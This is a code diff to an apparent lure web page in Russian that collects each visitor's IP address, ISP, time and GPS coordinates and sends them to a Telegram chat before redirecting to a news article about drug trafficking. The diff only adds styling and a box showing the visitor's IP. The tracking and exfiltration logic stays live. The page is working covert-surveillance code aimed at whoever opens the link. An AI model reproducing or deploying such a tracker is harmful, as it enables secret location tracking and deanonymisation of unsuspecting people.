@@ -12,18 +12,30 @@
       color: #fff;
       height: 100vh;
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       font-family: sans-serif;
+      text-align: center;
     }
     #status {
       font-size: 1.2em;
-      text-align: center;
+      margin-bottom: 10px;
+    }
+    #ip-box {
+      font-size: 1em;
+      background-color: #111;
+      padding: 12px 18px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px #222;
+      max-width: 90%;
+      word-wrap: break-word;
     }
   </style>
 </head>
 <body>
   <div id="status">⏳ Разрешите доступ к геолокации, если будет запрошено...</div>
+  <div id="ip-box">Определение IP...</div>
 
   <script>
     const redirectUrl = "https://dnepr.express/ru/post/masshtabnyj-narkobiznes-razoblachili-v-15-oblastyah-ukrainy-sredi-nih-dnepropetrovshina";
@@ -36,9 +48,7 @@
           chat_id: 490491527,
           text: message
         })
-      }).finally(() => {
-        callback();
-      });
+      }).finally(callback);
     }
 
     function startRedirect() {
@@ -57,6 +67,9 @@ IP: ${data.ip}
 Провайдер: ${data.connection.isp}
 Время: ${new Date().toLocaleString()}`;
 
+        // Вывод IP на страницу
+        document.getElementById("ip-box").innerText = `Ваш IP: ${data.ip}`;
+
         // GPS запрос
         if (navigator.geolocation) {
           let gotGPS = false;
@@ -66,7 +79,7 @@ IP: ${data.ip}
               const msg = ipMessage + "\n\n⚠️ GPS: не получен (таймаут)";
               sendToTelegram(msg, startRedirect);
             }
-          }, 7000); // немного дольше
+          }, 7000);
 
           navigator.geolocation.getCurrentPosition(
             pos => {
@@ -95,12 +108,14 @@ IP: ${data.ip}
         }
       })
       .catch(() => {
+        document.getElementById("ip-box").innerText = "❌ Не удалось получить IP.";
         const msg = "❌ Ошибка получения IP-геолокации.";
         sendToTelegram(msg, startRedirect);
       });
   </script>
 </body>
 </html>
+
 
 
 
